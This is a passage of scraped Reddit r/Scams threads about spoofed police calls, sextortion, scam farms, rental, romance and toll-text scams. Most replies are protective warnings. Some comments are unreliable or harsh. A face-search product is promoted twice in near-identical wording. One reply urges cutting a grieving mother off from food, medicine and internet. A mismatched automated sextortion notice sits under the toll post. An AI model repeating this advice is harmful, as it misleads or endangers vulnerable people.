- thanks for sharing! I'm sad to read that person went through 6 hours of hell. seems like it was the same in that mine was also a "high profile murder trial" - thankfully I was only on the phone for 20 minutes or so, but it was still a stressful 20 minutes! and I wasn't blamed for delaying a murder trial! jeez

for me the scammer left a VM and calling back took me to where I expected it would, it wasn't spoofed in that way, which is something I'd always relied on when considering these types of scams!
- Not necessarily. They may actually ask for a credit card payment and even your social. Of course, if you do, you‚Äôre just giving your CC info to a scammer.
- Lol also another giveaway for me!!!
- truly had no clue! I'd heard of IRS scams and others similar. I think the voicemail and that it was a local number and everything is what had me put my guard down
- aw dang, sorry to hear about your experience - but thank you for sharing! he definitely leaned into my anxiety which is when I was the most vulnerable to believing it!
- thank you!! and yes, so true - how did I forget the #1 rule - shut the f up! haha
- oh it's nice it was marked as a scam online at least! mine didn't show up with anything, which if it was an official number should've been a red flag in itself
- 6 hours and they lost money, I think it was $1500, at least I don‚Äôt think they lost $15,000, but that‚Äôs what the scammer ended up demanding.

Scammers do have the ability to get phone numbers to call them back on. Often for free, too. Or you can pay for VOIP and scam away virtually unfettered.
- Also in that one I linked, they did spoof the police department number, and then as ‚Äùverification‚Äù they told OP to look it up on Google, well what do you know, it‚Äôs the police department number, but spoofed so it wasn‚Äôt actually the police calling.
- oh that is so terrible, I feel horrible for that person
- that's crazy!! I searched the number they were calling from and didn't find anything which was another one of my red flags. should've just known then, honestly
- If they ever say, "look at the caller id", then you know it's 100% a scam, since they're counting on you not knowing it can be spoofed. Real police would never say that.


In your case it sounds like they got a Google voice number or similar. Scammers run pin scams all the time for this reason.

Title: Catfished from Bumble
Body: 27M in UK. Matched with a guy on bumble, talked for a few hours and moved to Instagram. The guy was being nice and said he wants to talk over a call and I shared my WhatsApp number. While adding him ok insta I did notice that his account was new and on bumble he was using passport. He explained by saying that he lives in the UK but is back home in Malaysia visiting family. Eventually we move on to WhatsApp and get on a video call. He says he wants to have "fun" and pushes me to go nude on call. I resit initially. He show me his dong and I kinda got comfortable so I showed him my ass and dong. He cut the call and immediately send the video back along with pictures of people in my followers list and those tagged and threatens to send it to them. I panicked and froze for a second while he started counting down from ten. I panick and reply saying stop and what I could do. He demanded 5k but I said I'm a broke af corporate slave and negotiate down to 600 and eventually ¬£150. I texted him finally saying I have his ip address and have reported it to police (I didn't thave any info of his IP or contact the police). I put a story on insta saying I was hacked and personal videos and messages were stolen and was being threatened. My neighbour saw this and immediately made me contact the police. They took down some information. Meanwhile I blocked his WhatsApp. A minutes later I got another number messaging me the pics and eventually send a message to a friend who has a private account. I didn't reply to any of the threats as per police instruction. 

Currently waiting to go meet the police on Saturday. 

Well, what can I do about this? The guy is in another country and I can't do anything. I feel so ashamed.

TLDR: got catfished and  threatened to leak my video. Talked to police. Unsure what to do.

- Don't pay anything. Block and delete and move on. Never respond to blackmail.

It's very unlikely that he will send anyone your photos, but if he does it's not the end of the world and you've already done what you can to shield yourself from embarrassment. Follow the police instructions. 

In future, don't send strangers pictures of your junk.
- Nothing good can ever come from sending nudes to randos.
- > Unsure what to do.

You ignore them and move on with your life.

Your dick isn't special and never will be. Sorry. Everybody you're close to knows you have one and nobody in the world is going to burn all connections with you cause some rando texted them a picture of it.

Has never happened, will never happen. Worst that comes to it is your friends mock you for falling for a scam in the first place.
- Since you're a WhatsApp user, go to settings > privacy, and make sure you have your privacy settings as: 

- last seen and online: my contacts
- profile photo: my contacts
- about: my contacts
- status: my contacts
- groups: my contacts
- calls: silence unknown callers
- fingerprint unlock: I would suggest you try it, if it's available to you.

This will all prevent random scammers from seeing if you're an active user, and see that you just saw their messages. Anyone reaching you legitimately can try to message you and you decide if you want to engage.

Also, unrelated to this: go to settings > security and enable two step verification. People don't know Whatsapp has 2FA and that you can attach an email address to your account, to help you recover it if you lose it. You should also enable a pin to prevent unauthorized transfers of the account to another phone.
- Trying to meet someone online is hell these days. So many scammers. You need to educate yourself.

Soneone who is really interested in getting to know you will not send you nude photos before meeting you. They won't ask for nude photos. Someone who is actually interested in meeting you will not start talking about money or investing before getting deep into an in-person relationship. 

Read through this sub. There are many sad stories here on r/scams of people who have lost money to scams that begin with meeting someone online. They pretend to be interested in you for a few days, weeks, even longer, and then they move on to the next stage of the scam: stealing your money with sextortion blackmail, or stealing your money with fake crypto trading sites, or advance fee scams.
- Sorry that happened to you. Must have been awful and so stressful. I can‚Äôt give you advice on legal action, but I can say **don‚Äôt feel ashamed** You did nothing wrong (so many people share pictures like this).
- Terrible situation, but damn Malaysia is such a red flag
- The bad news is this stuff is extremely prevalent and on the rise due to AI making it easier to do. The good news is you can say he's trying to extort you with AI-made fake images of you, and people will believe you  (especially by the time this stuff really takes off and it's happening to all of us).
Ignore him, ignore all other numbers that contact you..hell just ignore everyone, read a good book, try not to worry and enjoy your weekend.
- Worst thing you could do because now they know they are willing to pay, probably get bugged for awhile
- Thank you for the reply and point taken. 
Since it's a video, he's got my face on it as well. 
He's also threatened to upload it on the internet, could/should I do something with the Malaysian authorities?
- Sorry for being back, any advice on what to do LinkedIn wise. My name is quite unique and if you do a basic search you could easily locate me on linkedin or with just a Google search with the UK along with my name. I've deactivated LinkedIn for now. Should I get in touch with my work IT department to say this has happened to me in case the scammer reaches out to the company. He texted me "Your work will be affected by your scandal".

I know it's a long shot and possibly the worst case scenario because I don't want my work life to be affected by this. Also, he had screenshots of my insta, and I've got a good number of work colleagues on there.

Give it to me straight ü•≤
- This is a classic sextortion scam. They lure you in, get explicit content, then blackmail you. Do NOT pay them‚Äîit only encourages more threats. Block them everywhere, report the account, and if you‚Äôre worried, let someone you trust know. Also, run their photos through ProFaceFindr‚Äîyou‚Äôll likely find they‚Äôve used the same pics to scam others. Stay strong, they rely on fear to control you!
- Lesson learnt!
- Yeah, woke up today feeling better compared to yesterday!

Thanks for putting it like that!! Love that brutal honesty tbh, needed that haha
- Done all these, thanks a lot!!
- This was really helpful, thank you!
- It's been stressful, but I've talked to friends and that's really helped. Also, this incident became a reason to come out to a friend, and that's gone down well. So feeling much better now after seeing all the replies here. Thanks for your words. It's super kind.
- I'm not really willing to pay nor do I have the money lol. Idk, my lizard brain took over. Not even sure if it was the right move to put things on insta and face the embarrassment from colleagues and friends
- Who knows if he's even in Malaysia. I'd just follow whatever the cops tell you to do and close the door on this as soon as possible. If he uploads it to the Internet, so it goes.
- From what I understand, scammers really don't follow through on the threat - there's nothing to be gained by doing that. But putting your LinkedIn on pause for a while sounds like a reasonable thing to do. It's not like the scammer is going to bother posting your pix a year from now. 

Honestly, there's nothing you can do about this. Sending money to the scammer would not make the pictures disappear - it would do the opposite. If some work colleague gets a picture (very unlikely), all you can do is say that a private communication got hacked. It's not as if you were stealing from your company or doing anything that the rest of the world thinks is terrible or illegal.
- Their leverage is the threat of sending the videos to someone. If they actually sent the videos, then at that point the damage is done and they know they won‚Äôt get any money. They don‚Äôt care to embarrass you, they just want money. Stay strong!
- You‚Äôre welcome, and sometimes these things have silver linings (like coming out to your friend). It‚Äôs also a life lesson, that there are predatory people out there who seem nice, but underneath there‚Äôs a nefarious nature. Learn, adapt, move on.  You did nothing wrong.
- I don't do online dating, but just from what I see on this sub, I think generally it's advisable to stay on the dating app until you meet in person (in daylight, in public). And meet as soon as you can if the person seems interesting. There's no other way to be certain the person is not a scammer.
- Fair point!

Thanks for your replies. They've helped me calm down. Really appreciate it!

Well, if it does end up on the web, it probably could be the start of a very promising onlyfans career (lol, kidding, I don't have the confidence to put myself out there like that)
- I've gone dark on all socials for the moment, for a month at least - honestly needed a break from doom scrolling on insta lol

Thanks again! You've made logical statements, compared to my emotional response haha
- Thank you for your words! Really helped me calm down.
- That's definitely the motto from now when it comes to dating apps. And no more matching with people who use passport to fly around different countries on these apps.

Title: Chinese Government Crackdown
Body: There‚Äôs an article in the Wall Street Journal about Chinese actors being lured to Myanmar for supposed gigs and getting enslaved at scam farms.

‚ÄúThis week, the Chinese government called an unusual crisis meeting in the southern city of Kunming with officials from other countries in the region. The officials from Myanmar, Thailand, Laos, Cambodia, Vietnam and China pledged to arrest ringleaders, shut down so-called scam dens and free victims of human trafficking, according to a report on Chinese state television.‚Äù

The writers at least did some research, as they mention pig butchering.

- From what I've seen, the camps in Myanmar and other countries are all run by Chinese gangs that just pay off the local cops.
- Doesn't China have tons of similar scams running in their own country? Maybe they should take care of that before calling out other countries.
- Jezus, that's more than a scam, that's kidnapping and assault. Yikes.
- By now you‚Äôd have to put the gangs who run the scam farms on equal footing with mexican narco gangs. The corruption probably runs just as deep. Wish you luck China.
- There‚Äôs no way china will crack down on scams that transfer billions of currency units from other countries into China and enrich the elite. 

They may do some symbolic reining in of scammers who aren‚Äôt massively connected up so public perception is good. But nothing will change.
- The Chinese actor was "rescued" by the Thai police in Burma in about two days!  Isn't that a little too fast? There is no underpaid police force in the entire world that's so intelligent to solve a kidnapping in the blink of an eye. More likely, the local police and scammers all work together >_< ..... Thai Police forced the actor to say Thailand so safe I'll come back to vacation on TV in English and Chinese to save their tourist reputation >_<
- They're run by Chinese triads who branched out into scams when their gambling rackets were shut down by the Covid travel bans. They're mostly in Myanmar because the ongoing civil war has created a lawless border area where the triads are in charge. The gangs may be Chinese, but the victims of their scams and human trafficking are often also Chinese. That aspect is just less visible on the English Internet.
- Nationalism. When it's foreigners committing crimes against Chinese citizens, then, and only then, is it an outrage.
- whynotboth dot gif
- It's easier to point out what other countries are doing wrong then to try to fix what's happening in your own country.

The scammers also messed up trying to kidnap a somewhat well-known actor than a nobody. Now that the media and citizens are aware of it, everyone is going to care about foreign countries allowing their citizens to get kidnapped, even if the kidnappers are Chinese scammers too.

Who knows, maybe this effort will reduce the amount of workforce the scammers are able to get, and that might help scams targeting the western world too.
- Maybe they dislike competition
- Scams? They have government run slave camps in China.
- The scam part is what these kidnapped and assaulted people are forced to do. The scams we see everyday.
- The scammers that bribe the cops and officials the most, get to keep scamming. The ones who dont get arrested
- I was thinking the exact same thing. People are getting taken for entire retirement funds on the regular over and over again. We are talking about billions of dollars transfering to other countries. I wouldn't be surprised if the Chinese government (and other countries as well) are backing some of these scam groups. There is a transfer of wealth happening in this very moment and it isn't from one generation to the next. It's straight out of many many boomer bank accounts straight overseas.
- I don‚Äôt think you fully grasp the vast amount of pressure a country like China is able to immediately inflict on a country like Thailand.
- The Thai Police are in on it.
- Where they get most of their transplant organs they sell to rich foreigners.
- Well I really hope things to change for the better !

- Just to add that I realise this reads as very paranoid, I just wanted to make sure it wasn‚Äôt anything serious because I‚Äôve been dealing with some stalking recently and it puts me on edge when I see things like my personal email being used on dating sites
- It‚Äôs spam.  The scam is phishing. Delete.
- Might be from some small website trying to make themselves known in sketchy ways?
- Just ignore
- I assumed I would have received a welcome email or a confirmation email if that was the case which is why I was so confused to get this type of email from them
- Spam email went in your spam folder for a reason. Let your mail provider protect you.

Title: I don't know if this rental is legit or a scam.
Body: Hi. I'm wondering if someone could help out. I'm currently looking for a short-term apartment, and I found one on Craigslist that looks great, but I am thinking that it is too good to be true and thus a scam. Before going any further in providing personal information for the so-called "Property Manager", I wanted to check here to get someone's thoughts. The pictures are the same exact pictures of a propery on Zellow that shows as Off Market since 2019. Here is the link:

## The safe way to post about scam websites is:

* Write the website address in the title of your post
* Don't post clickable links in the body text

## So:

* If your post already has a website address in the title: edit the body of your post to remove the clickable link. For example, you can replace a .com with (dot)com - then wait until a moderator comes to take a look and approve this.
* If you didn't put the website address in the title: since titles aren't editable, we encourage you to delete this post, and post again - this time, writing the website in the title of your new post.
* If this post is NOT about a possible scam website: for example, if you tried to share a news article, or a government website, etc - just wait until a moderator comes to take a look and approve this.

- Quick update: I did find the post on Zillow and realtor.com and it looks like most of the description is copied exactly which is a big tell, so yea, not a great sign.
- Can you go see the property before you provide any info? The fastest way to separate a scam from a real listing is to go to the place in person. Go there and ring the doorbell, and see if it's actually for rent or not.
- Is that rent amount the going rate for a place of that size and quality in that area?  Because if it's listed for less than full market value, it's almost certainly a scam.  Real landlords don't post discounts and aren't in the business of losing money they could otherwise be making; scammers do that to activate people's desperation or greed.
- I've honestly never thought about this. Unfortunately I'm not in the area or else I would and I don't know of anyone in that immediate area. I'll have to keep this in mind for another time though.
- Yea, good point. It could be on the lower end of what is available. But since it is right on the water, a bit more still. I would expect closer to $1300 or $1400, but it's not necessarily scary low like $700 or something which I wouldn't even really consider. So yea. Valid point though.

Title: I need help please!!!
Body: So for context my dad had passed away back in April. My mom has began feeling lonely from my dad's passing as expected. But my Mother fell into the trap of talking to online scammers, and specifically one in particular. She met them through TikTok of all places, and to top it off, she even sent them money for their supposed child. He claims he is military and even told my mom he's on a deployment. I've explained to her that everything he is telling her is an attempt to get her attached. And unfortunately, she has began to believe  his lies to an unreasonable amount. She has told me on multiple occasions that she is upset at me because he won't continue to date her unless he has my "Blessings", but I've told my my mom, have they called you? Have they video chatted you? To which their response is, that they can't because their phone is broken to do those things. They were going under a different alias and I proved to her that they weren't who they said they were by reverse imaging. Then they showed a different picture and it was of another guy. He claims this is actually him but the name doesn't match. He scammed my mom out of 600 dollars thru steam gift cards. She buys them and sends the picture of the code, classic scam move. They also can't seem to spell correctly. Which is another red flag. But everytime She blocks him, she unblocks him and she says she is "In Love" with them and that she is too forgiving. And she is taking her anger out on me. 

I don't know what to do, she said she's planning to move out once they're back, and all I can do is let her fail and see her own mistakes.

- RIGHT in FRONT OF HER‚Ä¶ Do this: Search on Google **Brad Pitt Scam** Show her the recent results of this woman who just fell for a $700,000.00 scam thinking she was talking to the real Brad Pitt. Then go outside and point her to a Park Bench because that‚Äôs where she‚Äôll be sleeping once they‚Äôve cleaned her out if she continues believing in that Bullsh~t
- Classic romance scam. Go to YouTube search Last Week Tonight romance and you should get a good video. Then go to Pleasant Green and watch his romance scam video. Have local police go and talk to her. 

It is all pretend. The scammers are really good at being whomever the victim needs them to be. They fill the void the victim has. 

But ultimately the decision is hers to make. Does she want to send her money to scammers to use for drugs, most likely, or does she want to have money to live on. The scammers will take and take until she is bled dry.
- I was in the same predicament with my grandmother. I ended up talking to her online as another suitor - I used a male friend‚Äôs photos and he was happy to provide them - and ‚Äòstole‚Äô her from the scammer. It worked! An unorthodox approach, I know. 

She was just lonely and bored and wanted someone to talk to. And her new ‚Äòboyfriend‚Äô never asked for money and somehow always knew what she‚Äôd been up to and how her mood was. A miracle man for sure! ;) I kept up the ruse until she died of old age about two years later. It saved her finances and probably her home. (she was talking about selling her little house so she could help pay for him to move to her state.) 

That said, please be aware of recovery scammers. They stalk this place looking for victims to scam again by promising to get their money back for a fee. Your inbox will be swarming with them by now. ALL OF THEM ARE SCAMMERS! Block and ignore.
- The broken phone thing is so transparent it's a huge red flag. He could even borrow someone else's phone to video chat if he was the real person, which he's not. Have her watch the thousands of you tube and news reports about romance scams where people become homeless because they send all their money to these scammers.
- The military publishes romance scam red flag material.  It gives the truth of access deployed members have to banking and contact, in case they start asking her to accept payments on their behalf. AARP and Aura have good articles on it too.
- Tell your mom that you won't give your blessing unless you meet him in person.


Also tell your mom that you're so sure he'll never show up in person that if you meet him, you'll pay for all of his airfare, even if you don't like him. Also tell your mom that you'll apologize to her every day for a year if that happens.


Ask your mom that until she meets him, she is to keep a paper journal where she writes down every time she sends him money in any form. Tell her that if she doesn't, then she's admitting she is being scammed.
- Oh the typical 'I'm American military. My wife died and left me with X amount of children. These children are with me as I serve out in Afghanistan and they go to school here. I'm looking for a good, Christian woman...' blah, blah, blah!

I'm English and still live here in England and it's because of these scammers that I made my friends list private on FB. If they don't get you, they'll try your friends. 

Their pictures never match up when searched!

And if your mom claimed she had no money left or that one of her children were now POA, they'd soon disappear!!

They're the scum of the earth pretending to be military like that, especially when REAL military people have to fight for proper medical care if they're injured!

I bet all/most people on his friends list are female, too. 

I really hope your mother comes to her senses very soon,
- Military person on deployment is a very common scam.

Take away her access to this guy - whatever it takes.  He's already hooked her.
- I read in a comment that you live with and co-own your house with your mother due to inheritance after your father passed away.  Because of this you need to lock your credit so your mother can't steal your identity to take out loans against the house or open lines of credit in your name.  Victims of scams have been known to take out loans in a family member's name when they run out of their own money and your mom knows enough about your PII to do it online.  I'd also suggest pulling a credit report now to ensure that shenanigans haven't already happened.

If you want your mom out of the house make it boring and/or uncomfortable for her to live there.  I used to do this with deadbeat roommates.  Legally you can't cut off water, power, and natural gas but if she's not helping pay for the internet or CATV/Dish then you can lock her out of those.  I used to cut off the cable service and lock out all connections except my own at the internet router if roommates didn't pay.  Sure roommates still had their own phones but if they wanted to watch the Superbowl on the big screen then that cable bill better be up to date.

Also I hope you're not providing any food, OTC meds, toiletries, cleaning supplies, etc. for her.  You may have to start buying just enough food for yourself every day and locking up everything else in your room (install a deadbolt on the door).  Yes it sucks and it's an inconvenience for you, but the goal is to provide zero support of any kind, not just cutting off financial support.
- I am sorry to hear this. If you have other adults that can step in - grandparents, etc, have them do so before she loses everything
- Buddy, can you alert her bank that she is being scammed? show them proof that you're her child, and explain that she is totally in the grip of overseas romance scammers, and ask them to put an alert on her account.
- Get her tested for dementia.
- Have you reached out to Catfished?  They seem to have a good track record of convincing victims that its a scam.    But she would have to agree to participate.

  
If not, I would try the easy stuff, reverse image searches of the photos they send, and google searches to see if other people have been scammed with the same pics.  These scammers use scam packages they buy and so the methods are often the same.   This would most likely originate out of Nigeria.
- Get her a trac phone or some government free phone with the internet is impossible to get...

Put the internet in your name and close any Facebook, Instagram etc. Accounts....

The best you can do or let her find out the hard way one unfortunately...
- The problem is that your mom doesnt want to hear the truth because she's lonely. She is lonely and grieving. She may even know its a scam deep down, but she keeps playing along and giving money because its still filling a need for companionship, it makes her feel like someone cares about her, and the alternative is too painful. If she accepts its a scam, she has to accept that this person doesnt care about her and face her loneliness. 

That is why she is in denial and nothing you say will help. The best thing you can do is try to solve her loneliness in other ways. Does she have friends? Can she start going to any clubs to make new friends? Do you ever spend quality time with her? 

As long as she depends on the fantasy of the scammer for her mental health, she wont listen to you. Good luck, this is very hard and Im sorry
- As a widow myself, grief sucks and it messes with your mind. Unfortunately there are sick people out there who take advantage of this and prey on widows, not only because they‚Äôre vulnerable but also because they may be sitting on a life insurance payout. Everything you describe is classic catfish scam material: deployed overseas, broken phone, money for child, etc. If your mom uses Reddit there is an r/widowers group. Suggest to her that she join for companionship and support. Then suggest that she share this story for their feedback. She may not want to hear from you that she is being scammed because a) you‚Äôre her child b) she doesn‚Äôt think you understand what she is going through. She‚Äôs right about that, you can‚Äôt possibly fully understand. However, she may listen to a bunch of other widows, especially if she hears one after the other tell her they had the exact same experience.
- Be careful! The scammer might tell her that he's calling it all off because you won't accept him. He may decide he's made enough money and just disappear. Your Mom may blame you. That would be a disaster. I think you should keep a respectable distance and not interfere except for occasionally asking when you will meet him since he sounds so nice. Try and get a meeting commitment by saying you are so much looking forward to it. This may create a rift between them when he continues to dodge. No ultimatums, you don't need to offer to pay. Mom will lose a lot of money but the advice not to allow her to borrow is excellent. My concern is that if the house is free and clear that the deed might be offered to him. See if you can persuade her to hand it over for safe keeping - say you have a deposit box at the bank and if the house burns down it will be safe. So sorry you are in this position. My own mother was stubborn too.
- I'm sorry, OP.  You can't fight illogical people with logic.  

I'll never, ever understand how hearing "gift card" doesn't make everyone's ears immediately perk up to scams.  Like, why would an alleged soldier, with a broken phone, be demanding video game gift cards?  Or Apple gift cards?  Cash or similar like Venmo, I understand, but this makes no sense and it seems to fly right by everyone who falls victim to this stuff.
- Believe it or not, I showed that to her, and she still doesn't believe me.
- I've tried showing these things to her, but she doesn't believe me or want to believe it's happening to her.
- I'm glad you were able to get it to end, and jeep her happy all at the same time. Unfortunately for me, my mom is 48 years old and is acting like she is 18 again. This is something I can't get resolved. But I'm glad you were able to.
- Exactly, but she doesn't believe me. She's always going to have an income, though, because of my dad's pension.
- What is absolutely crazy is that I work on a military instilation. I see this everywhere and know the signs, everything she tells me is a red flag, but if I say anything, it's "How do you know" even though I tell her I see it everywhere almost everyday.
- I've never looked at it this way, but im definitely not paying that airfare, lol. Besides, he's on his "Deployment"
- Unfortunately if I even breath near her, she takes it very wrong and gets super worked up, im basically playing with fire, im doing my best not to add the gas and by letting her fail on her own is probably the best approach.
- I've told my grandfather, and all he told me was that if she leaves, let her leave and learn the hard way
- She‚Äôs only 48 and widowed for less than 1 year; this isn‚Äôt dementia, her brain is messed up due to grief. She is lonely and hurting and this scammer knows all the right things to say.
- I've tried hanging out with her, but I've been given the cold shoulder on multiple occasions. I've told her to even hang out with her friends, but she doesn't want to. I've told her that going on dates with guys isn't bad either, mainly to hang out, but you never know. She doesn't want to take my advice because in her eyes, why is she going to take advice from her little boy who isn't little anymore. She needs counseling but refuses to accept it!!! I'm tired of trying to help her if she isn't going to help herself. I feel like I've tried every play in the playbook just to be blown off on multiple or all occasions.
- This is heartbreaking, and unfortunately, romance scammers prey on vulnerable people like your mom. You‚Äôve already done the right thing by proving he‚Äôs fake, but scammers are experts at emotional manipulation. Try running his pictures through ProFaceFindr‚Äîit‚Äôll likely show up on other scam profiles, which might help convince her. If she won‚Äôt listen now, stay supportive so she has someone to turn to when reality hits.
- If you haven‚Äôt‚Ä¶ read some of the posts right here in this Scam related group also, including this: https://www.reddit.com/r/CryptoScams/s/N6Oguqm5MB
- Then the only thing you can do is warn everyone around her to not let her borrow money if she asks because she is involved in a scam. Let her know that when she runs out of money that you won't dig her out, and stick to it. It is sad to watch them knowingly throw their money away but there is only so much you can do.
- She might give all that money to the scammer and take loans out. Her income is not safe.
- That's the thing -- you pay after he visits, which will never happen. Basically, show your mom that you're confident that he will not show, and that you're willing to put your money where your mouth is.
- If it's your house why don't you tell her she has, say 4 weeks, to 'dump' this scammer and stop being a fool to herself or you'll kick her out?!

Then start showing her apartments for rent in your area!

Or does she pay you a good enough rent that you'd happily keep her around?
- She's not going anywhere, that part is all fantasy.  The real part is that she will give all of her money to this guy.
- Won't disagree with you, however my words come from personal experience. Much I don't know. I wish her well.
- Unfortunately, it's not dementia. I called Adult Protective Services on my 75-year-old friend in mental and physical decline, because she thinks she's in love with a Johnny Depp scammer. The investigator told me falling for scams is and of itself is not enough proof of  dementia or even self-neglect.

As a widow, I ended up having a fling with a single neighbor within months of losing my husband. Looking for love and comfort is a normal response....but she needs to be out with people in the meat-world. What are her interests? Community theatre? Crafting? Her church? She needs to be there. I took up burlesque dancing, glass fusing, and painting. I became an animist minister. Midlife/empty-nest is the perfect time to do these things, and uncover who SHE is, as opposed to all the roles (mother, wife, lover) she has played in the past. Anything you can do to encourage this would be good. Volunteer for some community project and invite her along.

 I also recommend The Grief Recovery Method (for both of you,) as it is very helpful with complex grief.
- How about an intervention? Catfished does them...but if you can get a group of people together, including someone she might listen to...a minister she respects, even someone from the local police department...people who can gently get through to her, without judgment...it might break the spell.
- I've already begun that process, luckily, and honestly, she's never getting a cent out of me after everything she's done to me.
- Honestly, that's on her, I've tried helping her over and over with her financial problems. And if she can't seem to help herself, why am I going to help her.
- That's not a bad idea, I wouldn't mind, but knowing my bad luck, it would happen lol
- Because when my dad died, it went into a specific clause. When we did the paperwork, I was my dad's next of kin, but my mom can legally live here because she technically owns 1/3 estate by just being married to him. I can't kick her out. She can't kick me out. She can't sell the house from under me. Basically, I won't own the house until she passes. But she constantly threatens to move out, to which I tell her, you want to move out, that's on you. But she never does.
- Well as messed up as it sounds, I want her to leave, she says she doesn't like being in the house we live in, and I told her it's my house, she can leave whenever she feels.
- Yes I think that's for the best.  She's upset at you for trying to help her, and at this point it's an addiction.  You can't do much more at this point really.
- Sigh. I'll bet she has told the scammers something of this, which is why they are doing this bullshit of "cannot date you unless your child gives blessings".
- Where does she think she's going to go? 

You can report him to the Federal Trade Commission (FTC) online or by calling 877 382 4357
or the FBI Internet Crime Compaint Centre. 

You can use the Service members Civil Relief Act Service to confirm their active duty status.

You did the reverse image search, did you check for duplicate profiles or search their name with 'scam'? 

I found all this on Google.

Title: Oh Noes! The Toll Police are after me!
Body: I just received a blank text from the (707) area code. No content other than a .pdf file attachment. The document claims to be from the ‚Äú2025 Toll Enforcement Authority‚Äù. The ‚ÄúToll Violation Notice‚Äù claims that on the date of ‚ÄúJanuary 2025‚Äù I traveled through a toll facility without paying. Apparently I have fifteen days to pay up or there will be dire consequences.

This is puzzling - I haven‚Äôt driven through a toll booth in at least ten years. How could this happen to me?

I did not click the hyperlink on the document. I have been tempted to print the notice out in order to wipe my ass with it.

At the risk of stating the obvious, don‚Äôt respond to these.

Comments:
- Hi /u/Pynchon_A_Loaff, AutoModerator has detected keywords in your post indicating that this is a porn blackmail email scam. The exact wording of the emails varies, but there are generally four main parts. They claim to have placed software/malware on a porn/adult video site, they claim to have a video of you masturbating or watching porn, they threaten to release the video to your friends/family/loved ones/boss/dog, and they demand that you pay them in order for them to delete the video. There are variations of this scam that claim you were caught in a child porn/grooming sting. Rest assured that this is a very common spam campaign and there is no truth behind the email or the threats. While this type of blackmail attempt is a bluff, even when the blackmailer actually has compromising videos, paying them does not buy silence - it merely ensures more demands for money. One should never pay a blackmailer... [Here is the /r/scams mega thread on this scam](https://www.reddit.com/r/Scams/comments/8gsjba/the_blackmail_email_scam/). If you want to help other people who receive the same email as you, you should copy/paste the email you received into the [megathread](https://www.reddit.com/r/Scams/comments/jij7zf/the_blackmail_email_scam_part_6/).

- My elderly dad got a text like these and he‚Äôs been losing sleep over it. He‚Äôs had a stroke and his vision is impacted, plus he gets confused sometimes, so I can‚Äôt figure out if it‚Äôs this scam. I‚Äôm assuming it is but since I live 3000 miles away I can‚Äôt see it for myself. There‚Äôs a special place in hell for these scammers. Ugh.
- I got one from a 63 country code earlier That‚Äôs what I have two days to pay but no attachment. I think some of these are related to job searches I did on indeed in the last month. I did actually get a paper in the mail from some tolls months ago that I know that I stopped and paid, but it was legit. However, I don‚Äôt even wanna respond to these ones I get now I don‚Äôt want them know. My number is good.

I also got one that was through a Hotmail address telling me it was the IRS just the other day which I also blocked
- At least you noticed it.  The toll scam has been posted here a lot.

[https://www.reddit.com/r/Scams/search/?q=toll&cId=73e5fa6a-2b82-4d8f-bf9a-2fb29bacc6cb&iId=96a7590b-c074-49a6-afe9-7bc741c0bf8f](https://www.reddit.com/r/Scams/search/?q=toll&cId=73e5fa6a-2b82-4d8f-bf9a-2fb29bacc6cb&iId=96a7590b-c074-49a6-afe9-7bc741c0bf8f)
- Yes, it's a scam.  However...

You mentioned "I haven‚Äôt driven through a toll booth in at least ten years." You may not know that not all toll roads have booths these days -- some just have cameras and a sign with a website (and sometimes those signs are easily seen and sometimes they aren't). Your license plate will be photographed and a bill sent to the address on file, directing you to pay at that website. 

If your address is not current, or you don't pay attention to your snail mail, you actually could get in some hot water. But you won't hear about in via text!
- They need to get in line behind the companies letting me know my 12 year old son's extended service agreement on his vehicle is about to expire.
- I have been billed twice by Sunpass for an incorrect plate. They billed me by mail cleared up with a phone call. Apparently someone there can't tell the difference between 97 GMC pick up and a 2013 Nissan Juke lol.
- Had a similar from a .com- domain today. Apparently I owe tolls on the other side of the country. :P

If you see ".com-" in a URL it is 100% a scam, every single time.

EVERY SINGLE TIME.

amazon.com- is a scam.

usps.com- is a scam.

Same with any TLD.

irs.gov- is a scam.

fbi.gov- is a scam.

A dash where a slash should be is a scam.

**
- It‚Äôs 100% scam
- It's a scam
- We got a couple of those to our generic customer support phone number LOL. Like.... uh ... the phone number isn't even tied to a single individual, let alone on any vehicle registration.

They just love to blanket the world with scams, hoping for bites (and apparently there are enough bites to justify them persisting with it).
- I just got this text with a pdf attached as well! Good to know I‚Äôm not trippin
- I lit just got one for FastTrac toll violation.   There is no such toll called that anywhere near me.   The country code was the Philippines.
- What ya going to do when they come for you.
They keep trying.
- I knew it was a scam immediately. I did post a screenshot on Facebook because I have a lot of friends who might have gone for that hook.
- Yup.  Wife just got a text for MA toll.  We‚Äôre in WA, other side of USA.  ‚ÄúReport Junk‚Äù and move on.
- I got this message a couple of days ago, myself.  I deleted it right away.  There are no road or bridge tolls anywhere close to where I live.
- I got this too! I laughed and deleted the text without opening it.
- A legitimate toll bill will be mailed to the owner of the vehicle. They capture a picture of the car, the driver and the plate. Amazingly clear accurate photos, CIA quality. If only bodegas had such awesome surveillance, anyway, my kids borrowed my car and drove to FL from MI last year btw and I just received a toll bill in the mail last week. There has been a total of 8 toll bills. They keep rolling in and I keep passing them along‚Ä¶.
- I got this one this morning and the funny thing is, I don‚Äôt even own a car nor do I have a license üò≠
- I work for NC Quick Pass and I can inform anyone receiving texts, that for the organization I work for (Can't confirm if it's the same for other tolling agencies such as EZPass, Peach Pass, SunPass etc) that we would never send a notification via text asking for money for tolls. The only number of which you'd receive text alerts from NC Quick Pass is from 696277. Only time you would receive alerts is if you have a statement or invoice available and that's regarding that you have opted in for text alerts when you'd either went online to pay a bill and opted in, have an account with us, or gave us a call to pay and requested to add your phone number opting in for alerts. Hope this helps. Of course, if you ever have any questions for our agency particularly you can always give us a call at 877-769-7277 and our agents are happy to assist.
- I get a number of anonymous ‚Äúhi, how are you doing today?‚Äù texts from the 707, Northern California and 2,000 miles from me.
- I wouldn‚Äôt even open the PDF. These criminals can embed viruses in them. I got a few and just deleted them, so I was happy to see just how laughable they are.
- I got a real notice of violation for going through a work zone too fast. It had photos taken of my car.
- I received a text earlier today from a +63 Phillippines number LOL.  We do not have toll roads here, I live in a rural area.
- I don't know where you live but in Illinois they will send a notice in the mail with your license plate visible and the time and location it happened. The text is a scam. There were a lot of those happening last year, apparently enough victims responded for them to keep running it. 

And don't try to call it back, the number was spoofed for the text and probably sent from a computer with about a thousand other people all at once.

But if you want to make yourself feel better call the actual number associated with the state's toll system. They will be able to tell you if there is a claim against your plate number.
- This sounds like a typical scam that tries to create panic. If you haven't been through a toll booth recently, there's no way you owe them anything. These scammers often send blank texts with random .pdf attachments to make it look official. 

Real toll authorities won't send messages like that!

